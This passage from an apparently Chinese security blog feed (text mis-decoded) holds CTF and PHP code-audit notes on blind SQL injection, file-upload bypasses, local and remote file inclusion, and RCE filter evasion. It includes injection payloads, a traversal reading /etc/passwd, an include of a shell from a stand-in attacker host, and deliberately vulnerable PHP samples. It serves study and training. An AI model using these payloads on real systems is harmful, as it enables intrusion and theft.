href="#1-æ ¸å¿ƒç‰¹å¾-2" class="headerlink" title="1. æ ¸å¿ƒç‰¹å¾"></a>1. æ ¸å¿ƒç‰¹å¾</h4><ul><li><p>ä¸ç›´æ¥è¿”å›æŸ¥è¯¢ç»“æœï¼Œä»…é€šè¿‡é¡µé¢åé¦ˆï¼ˆå¦‚â€œuser existâ€&#x2F;â€œuser not existâ€ï¼‰åˆ¤æ–­æŸ¥è¯¢æ˜¯å¦æˆåŠŸã€‚</p></li><li><p>ç¤ºä¾‹PHPä»£ç ï¼ˆå¸ƒå°”ç›²æ³¨åœºæ™¯ï¼‰ï¼š</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$conn</span>=<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$count</span>=<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$count</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user exist&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user not exist&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-æ³¨å…¥æ€è·¯ï¼šé€å­—ç¬¦çŒœè§£"><a href="#2-æ³¨å…¥æ€è·¯ï¼šé€å­—ç¬¦çŒœè§£" class="headerlink" title="2. æ³¨å…¥æ€è·¯ï¼šé€å­—ç¬¦çŒœè§£"></a>2. æ³¨å…¥æ€è·¯ï¼šé€å­—ç¬¦çŒœè§£</h4><ul><li>åˆ©ç”¨å­—ç¬¦ä¸²æˆªå–å‡½æ•°ï¼ˆå¦‚ <code>substr</code>ï¼‰ï¼Œé€ä½éªŒè¯ç›®æ ‡å­—æ®µï¼ˆå¦‚å¯†ç ï¼‰çš„å­—ç¬¦ã€‚</li></ul><h4 id="3-å…³é”®å‡½æ•°ï¼šsubstr"><a href="#3-å…³é”®å‡½æ•°ï¼šsubstr" class="headerlink" title="3. å…³é”®å‡½æ•°ï¼šsubstr"></a>3. å…³é”®å‡½æ•°ï¼šsubstr</h4><ul><li><p>è¯­æ³•ï¼š<code>substr(å­—ç¬¦ä¸², èµ·å§‹ä½ç½®, æˆªå–é•¿åº¦)</code></p></li><li><p>ç¤ºä¾‹ï¼š<code>substr(password,1,1)</code> è¡¨ç¤ºæˆªå– <code>password</code> å­—æ®µçš„ç¬¬1ä¸ªå­—ç¬¦ï¼ˆèµ·å§‹ä½ç½®ä»1å¼€å§‹ï¼‰ã€‚</p></li></ul><h4 id="4-ç¤ºä¾‹æ“ä½œ"><a href="#4-ç¤ºä¾‹æ“ä½œ" class="headerlink" title="4. ç¤ºä¾‹æ“ä½œ"></a>4. ç¤ºä¾‹æ“ä½œ</h4><ul><li><p>çŒœè§£å¯†ç ç¬¬1ä¸ªå­—ç¬¦ï¼šæ³¨å…¥è¾“å…¥ï¼ˆURLç¼–ç ï¼‰ï¼š<code>username=%27or%20substr(password,1,1)=%271%27%23</code></p></li><li><p>å®é™…æ‰§è¡Œçš„SQLè¯­å¥ï¼š</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> substr(password,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>#<br></code></pre></td></tr></table></figure></li><li><p>é€»è¾‘è¯´æ˜ï¼šè‹¥å¯†ç ç¬¬1ä¸ªå­—ç¬¦æ˜¯ <code>1</code>ï¼Œé¡µé¢è¿”å›â€œuser existâ€ï¼›å¦åˆ™è¿”å›â€œuser not existâ€ï¼ˆç¤ºä¾‹ä¸­å¯†ç ç¬¬1ä¸ªå­—ç¬¦ä¸º <code>3</code>ï¼Œæ•…è¿”å›â€œuser not existâ€ï¼‰ã€‚</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PHPä»£ç å®¡è®¡</title>
    <link href="/2025/11/08/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/11/08/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><h4 id="ç»•è¿‡ä¸Šä¼ æ£€æŸ¥"><a href="#ç»•è¿‡ä¸Šä¼ æ£€æŸ¥" class="headerlink" title="ç»•è¿‡ä¸Šä¼ æ£€æŸ¥"></a>ç»•è¿‡ä¸Šä¼ æ£€æŸ¥</h4><ul><li><p>å‰ç«¯æ£€æŸ¥æ‰©å±•å</p><p>æŠ“åŒ…ç»•è¿‡å³å¯ã€‚</p></li><li><p><code>Content-Type</code> æ£€æµ‹æ–‡ä»¶ç±»å‹</p><p>æŠ“åŒ…ä¿®æ”¹ <code>Content-Type</code> ç±»å‹ï¼Œä½¿å…¶ç¬¦åˆç™½åå•è§„åˆ™ã€‚</p></li><li><p>æœåŠ¡ç«¯æ·»åŠ åç¼€</p><p>å°è¯• <code>%00</code> æˆªæ–­ã€‚</p></li><li><p>æœåŠ¡ç«¯æ‰©å±•åæ£€æµ‹</p><p>åˆ©ç”¨è§£ææ¼æ´ã€‚</p></li><li><p>Apache è§£æ</p><p>Apache å¯¹åç¼€è§£ææ˜¯ä»å³å‘å·¦çš„</p><p><code>phpshell.php.rar.rar.rar.rar</code> å› ä¸º Apache ä¸è®¤è¯† <code>.rar</code> è¿™ä¸ªæ–‡ä»¶ç±»å‹ï¼Œæ‰€ä»¥ä¼šä¸€ç›´éå†åç¼€åˆ° <code>.php</code>ï¼Œç„¶åè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ª PHP æ–‡ä»¶ã€‚</p></li><li><p>IIS è§£æ</p><p>IIS 6 ä¸‹å½“æ–‡ä»¶åä¸º <code>abc.asp;xx.jpg</code> æ—¶ï¼Œä¼šå°†å…¶è§£æä¸º <code>abc.asp</code>ã€‚</p></li><li><p>PHP CGI è·¯å¾„è§£æ</p><p>å½“è®¿é—® <code>http://www.a.com/path/test.jpg/notexist.php</code> æ—¶ï¼Œä¼šå°† <code>test.jpg</code> å½“åš PHP è§£æï¼Œ <code>notexist.php</code> æ˜¯ä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚æ­¤æ—¶ Nginx çš„é…ç½®å¦‚ä¸‹</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<br>  <span class="hljs-attribute">root</span> html;<br>  <span class="hljs-attribute">fastcgi_pass</span> <span class="hljs-number">127.0.0.1:9000</span>;<br>  <span class="hljs-attribute">fastcgi_index</span> index.php;<br>  <span class="hljs-attribute">fastcgi_param</span> SCRIPT_FILENAME /scripts<span class="hljs-variable">$fastcgi_script_name</span>;<br>  <span class="hljs-attribute">include</span> fastcgi_param;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>å…¶ä»–æ–¹å¼</p><p>åç¼€å¤§å°å†™ã€åŒå†™ã€ç‰¹æ®Šåç¼€å¦‚ <code>php5</code> ç­‰ï¼Œä¿®æ”¹åŒ…å†…å®¹çš„å¤§å°å†™è¿‡ WAF ç­‰ã€‚</p></li></ul><p><a href="https://blog.csdn.net/m0_59598029/article/details/138793923">æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆå…¨ç½‘æœ€è¯¦ç»†ï¼‰</a></p><p><a href="https://blog.csdn.net/weixin_46684578/article/details/119141109">æ–‡ä»¶ä¸Šä¼ ä¹‹ .htaccessæ–‡ä»¶getshell</a></p><p><a href="https://blog.csdn.net/lza20001103/article/details/124427171">æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹MIME typeéªŒè¯åŸç†å’Œç»•è¿‡</a></p><h2 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h2><p>å¸¸è§çš„å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°æœ‰ï¼š</p><ul><li>PHPï¼š<code>include()</code>ï¼Œ<code>include_once()</code>ï¼Œ<code>require()</code>ï¼Œ<code>require_once()</code>ï¼Œ<code>fopen()</code>ï¼Œ<code>readfile()</code> ç­‰</li><li>JSP Servletï¼š<code>ava.io.File()</code>ï¼Œ<code>java.io.FileReader()</code> ç­‰</li><li>ASPï¼š<code>includefile</code>ï¼Œ<code>includevirtual</code> ç­‰</li></ul><p>å½“ PHP åŒ…å«ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œä¼šå°†è¯¥æ–‡ä»¶å½“åš PHP ä»£ç æ‰§è¡Œï¼Œè€Œä¸ä¼šåœ¨æ„æ–‡ä»¶æ—¶ä»€ä¹ˆç±»å‹ã€‚</p><h4 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h4><p>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ŒLocal File Inclusionï¼ŒLFIã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/home/wwwrun/&#x27;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;.php&#x27;</span>)) &#123;<br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/home/wwwrun/&#x27;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œå¯ç”¨ %00 æˆªæ–­çš„æ–¹å¼è¯»å– <code>/etc/passwd</code> æ–‡ä»¶å†…å®¹ã€‚</p><ul><li><p><code>%00</code> æˆªæ–­</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>éœ€è¦ <code>magic_quotes_gpc=off</code>ï¼ŒPHP å°äº 5.3.4 æœ‰æ•ˆã€‚</p></li><li><p>è·¯å¾„é•¿åº¦æˆªæ–­</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/.[â€¦]/</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>./.<br></code></pre></td></tr></table></figure><p>Linux éœ€è¦æ–‡ä»¶åé•¿äº 4096ï¼ŒWindows éœ€è¦é•¿äº 256ã€‚</p></li></ul><h4 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$route</span> == <span class="hljs-string">&quot;share&quot;</span>) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$basePath</span> . <span class="hljs-string">&quot;/action/m_share.php&quot;</span>;<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$route</span> == <span class="hljs-string">&quot;sharelink&quot;</span>) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$basePath</span> . <span class="hljs-string">&quot;/action/m_sharelink.php&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€ å˜é‡ <code>basePath</code> çš„å€¼ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?basePath=http:/</span><span class="hljs-regexp">/attacker/</span>phpshell.txt?<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆçš„ä»£ç æ‰§è¡Œäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;http://attacker/phpshell.txt?/action/m_share.php&quot;</span>;<br></code></pre></td></tr></table></figure><p>é—®å·åçš„éƒ¨åˆ†è¢«è§£é‡Šä¸º URL çš„ querystringï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§ã€Œæˆªæ–­ã€ã€‚</p><p><img src="https://pic1.imgdb.cn/item/693d6f5ffe7cfeca3822eec5.png"></p><p><a href="https://konwait12.github.io/my-kon-blog/posts/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><strong>PHPä¼ªåè®®è¯¦è§£</strong></a></p><p><a href="https://www.cnblogs.com/xinghaihe/p/18416524">æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¯¦è§£ä¸CTFå®æˆ˜ </a></p><p><a href="/html/taishan.html">ä¼ªåè®®è¿‡æ»¤ç»•è¿‡</a></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="ç›´æ¥æ‰§è¡Œä»£ç "><a href="#ç›´æ¥æ‰§è¡Œä»£ç " class="headerlink" title="ç›´æ¥æ‰§è¡Œä»£ç "></a>ç›´æ¥æ‰§è¡Œä»£ç </h3><p>PHP ä¸­æœ‰ä¸å°‘å¯ä»¥ç›´æ¥æ‰§è¡Œä»£ç çš„å‡½æ•°ã€‚</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>();<br><span class="hljs-built_in">assert</span>();<br><span class="hljs-built_in">system</span>();<br><span class="hljs-built_in">exec</span>();<br><span class="hljs-built_in">shell_exec</span>();<br><span class="hljs-built_in">passthru</span>();<br><span class="hljs-built_in">escapeshellcmd</span>();<br><span class="hljs-built_in">pcntl_exec</span>();<br>......<br></code></pre></td></tr></table></figure><h3 id="preg-replace-ä»£ç æ‰§è¡Œ"><a href="#preg-replace-ä»£ç æ‰§è¡Œ" class="headerlink" title="preg_replace() ä»£ç æ‰§è¡Œ"></a><code>preg_replace()</code> ä»£ç æ‰§è¡Œ</h3><p><code>preg_replace()</code> çš„ç¬¬ä¸€ä¸ªå‚æ•°å¦‚æœå­˜åœ¨ <code>/e</code> æ¨¡å¼ä¿®é¥°ç¬¦ï¼Œåˆ™å…è®¸ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span>, <span class="hljs-string">&quot;addslashes(\\1)&quot;</span>, <span class="hljs-variable">$var</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰ <code>/e</code> ä¿®é¥°ç¬¦ï¼Œå¯ä»¥å°è¯• %00 æˆªæ–­ã€‚</p><h3 id="preg-match-ä»£ç æ‰§è¡Œ"><a href="#preg-match-ä»£ç æ‰§è¡Œ" class="headerlink" title="preg_match ä»£ç æ‰§è¡Œ"></a><code>preg_match</code> ä»£ç æ‰§è¡Œ</h3><p><code>preg_match</code> æ‰§è¡Œçš„æ˜¯åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œåˆ™å…è®¸ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Long.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>    &#125;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><details><summary>ç‚¹å‡»è¿™é‡Œå±•å¼€è¯¦ç»†å†…å®¹</summary><p>è¿™é“é¢˜æ˜¯ <code>xman</code> è®­ç»ƒèµ›çš„æ—¶å€™ï¼Œæ¢…å­é…’å¸ˆå‚…å‡ºçš„ä¸€é“é¢˜ã€‚è¿™ä¸€ä¸²ä»£ç æè¿°æ˜¯è¿™æ ·å­ï¼Œæˆ‘ä»¬è¦ç»•è¿‡ <code>A-Z</code>ã€<code>a-z</code>ã€<code>0-9</code> è¿™äº›å¸¸è§„æ•°å­—ã€å­—æ¯å­—ç¬¦ä¸²çš„ä¼ å‚ï¼Œå°†éå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢ï¼Œæœ€åèƒ½æ„é€ å‡º <code>a-z</code> ä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²é•¿åº¦å°äº <code>40</code> ã€‚ç„¶åå†åˆ©ç”¨ <code>PHP</code> å…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ‹¼æ¥å‡ºä¸€ä¸ªå‡½æ•°åï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯ <code>getFlag</code>ï¼Œç„¶ååŠ¨æ€æ‰§è¡Œè¯¥ä»£ç å³å¯ã€‚</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘çš„é—®é¢˜æ˜¯å¦‚ä½•é€šè¿‡å„ç§å˜æ¢ï¼Œä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿå»æˆåŠŸè¯»å–åˆ° <code>getFlag</code> å‡½æ•°ï¼Œç„¶åæ‹¿åˆ° <code>webshell</code> ã€‚</p><p>åœ¨ç†è§£è¿™ä¸ªä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å¤§å®¶äº†è§£çš„æ˜¯ <code>PHP</code> ä¸­å¼‚æˆ– <code>^</code> çš„æ¦‚å¿µã€‚</p><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ä¸‹é¢è¿™æ®µä»£ç ï¼š</p><pre><code class="hljs">&lt;?php    echo &quot;A&quot;^&quot;?&quot;;?&gt;</code></pre><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer1.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¾“å‡ºçš„ç»“æœæ˜¯å­—ç¬¦ <code>~</code>ã€‚ä¹‹æ‰€ä»¥ä¼šå¾—åˆ°è¿™æ ·çš„ç»“æœï¼Œæ˜¯å› ä¸ºä»£ç ä¸­å¯¹å­—ç¬¦ <code>A</code> å’Œå­—ç¬¦ <code>?</code> è¿›è¡Œäº†å¼‚æˆ–æ“ä½œã€‚åœ¨ <code>PHP</code> ä¸­ï¼Œä¸¤ä¸ªå˜é‡è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œå…ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆ <code>ASCII</code> å€¼ï¼Œå†å°† <code>ASCII</code> å€¼è½¬æ¢æˆäºŒè¿›åˆ¶å†è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œï¼Œåˆå°†ç»“æœä»äºŒè¿›åˆ¶è½¬æ¢æˆäº† <code>ASCII</code> å€¼ï¼Œå†å°† <code>ASCII</code> å€¼è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å¼‚æˆ–æ“ä½œæœ‰æ—¶ä¹Ÿè¢«ç”¨æ¥äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ã€‚</p><p>æ¯”å¦‚åƒä¸Šé¢è¿™ä¸ªä¾‹å­</p><p><code>A</code> çš„ <code>ASCII</code> å€¼æ˜¯ <code>65</code> ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯ <code>01000001</code></p><p><code>?</code> çš„ASCIIå€¼æ˜¯ <code>63</code> ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯ <code>00111111</code></p><p>å¼‚æˆ–çš„äºŒè¿›åˆ¶çš„å€¼æ˜¯ <code>â€­01111110â€¬</code> ï¼Œå¯¹åº”çš„ <code>ASCII</code> å€¼æ˜¯ <code>126</code> ï¼Œå¯¹åº”çš„å­—ç¬¦ä¸²çš„å€¼å°±æ˜¯ <code>~</code> äº†</p><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ <code>PHP</code> æ˜¯å¼±ç±»å‹çš„è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ <code>PHP</code> ä¸­æˆ‘ä»¬å¯ä»¥ä¸é¢„å…ˆå£°æ˜å˜é‡çš„ç±»å‹ï¼Œè€Œç›´æ¥å£°æ˜ä¸€ä¸ªå˜é‡å¹¶è¿›è¡Œåˆå§‹åŒ–æˆ–èµ‹å€¼æ“ä½œã€‚æ­£æ˜¯ç”±äº <code>PHP</code> å¼±ç±»å‹çš„è¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯¹ <code>PHP</code> çš„å˜é‡ç±»å‹è¿›è¡Œéšå¼çš„è½¬æ¢ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹è¿›è¡Œä¸€äº›éå¸¸è§„çš„æ“ä½œã€‚å¦‚å°†æ•´å‹è½¬æ¢æˆå­—ç¬¦ä¸²å‹ï¼Œå°†å¸ƒå°”å‹å½“ä½œæ•´å‹ï¼Œæˆ–è€…å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€æ®µä»£ç ï¼š</p><pre><code class="hljs">&lt;?php    function B()&#123;        echo &quot;Hello Angel_Kitty&quot;;    &#125;    $_++;    $__= &quot;?&quot; ^ &quot;&#125;&quot;;    $__();?&gt;</code></pre><p>ä»£ç æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer2.png"></p><p>æˆ‘ä»¬ä¸€èµ·æ¥åˆ†æä¸€ä¸‹ä¸Šé¢è¿™æ®µä»£ç ï¼š</p><p>1ã€<code>$_++;</code> è¿™è¡Œä»£ç çš„æ„æ€æ˜¯å¯¹å˜é‡åä¸º <code>&quot;_&quot;</code> çš„å˜é‡è¿›è¡Œè‡ªå¢æ“ä½œï¼Œåœ¨ <code>PHP</code> ä¸­æœªå®šä¹‰çš„å˜é‡é»˜è®¤å€¼ <code>null</code> ï¼Œ<code>null==false==0</code> ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸ä½¿ç”¨ä»»ä½•æ•°å­—çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡å¯¹æœªå®šä¹‰å˜é‡çš„è‡ªå¢æ“ä½œæ¥å¾—åˆ°ä¸€ä¸ªæ•°å­—ã€‚</p><p>2ã€<code>$__=&quot;?&quot; ^ &quot;&#125;&quot;;</code> å¯¹å­—ç¬¦ <code>?</code> å’Œ <code>&#125;</code> è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°ç»“æœ <code>B</code> èµ‹ç»™å˜é‡åä¸º <code>__</code> (ä¸¤ä¸ªä¸‹åˆ’çº¿)çš„å˜é‡</p><p>3ã€<code>$ __ ();</code> é€šè¿‡ä¸Šé¢çš„èµ‹å€¼æ“ä½œï¼Œå˜é‡ <code>$__</code> çš„å€¼ä¸º <code>B</code> ï¼Œæ‰€ä»¥è¿™è¡Œå¯ä»¥çœ‹ä½œæ˜¯ <code>B()</code> ï¼Œåœ¨ <code>PHP</code> ä¸­ï¼Œè¿™è¡Œä»£ç è¡¨ç¤ºè°ƒç”¨å‡½æ•° <code>B</code> ï¼Œæ‰€ä»¥æ‰§è¡Œç»“æœä¸º <code>Hello Angel_Kitty</code> ã€‚åœ¨ <code>PHP</code> ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ã€‚</p><p>çœ‹åˆ°è¿™é‡Œï¼Œç›¸ä¿¡å¤§å®¶å¦‚æœå†çœ‹åˆ°ç±»ä¼¼çš„ <code>PHP</code> åé—¨åº”è¯¥ä¸ä¼šé‚£ä¹ˆè¿·æƒ‘äº†ï¼Œä½ å¯ä»¥é€šè¿‡ä¸€å¥å¥çš„åˆ†æåé—¨ä»£ç 